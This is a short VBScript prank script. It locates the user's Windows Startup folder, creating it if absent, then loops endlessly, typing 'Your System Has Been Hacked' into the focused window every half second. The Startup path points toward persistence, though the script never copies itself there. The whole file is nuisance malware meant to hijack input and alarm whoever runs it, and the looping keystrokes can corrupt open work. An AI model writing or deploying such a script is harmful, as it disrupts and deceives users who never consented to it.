Dim wsh, fso, labDir

Set wsh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Path to Startup folder
labDir = wsh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\"

' Create Startup folder if it doesn't exist
If Not fso.FolderExists(labDir) Then
    fso.CreateFolder labDir
End If

' Infinite loop sending keystrokes
Do
    wsh.SendKeys "Your System Has Been Hacked 😂☺️...."
    WScript.Sleep 500  ' wait half a second
Loop
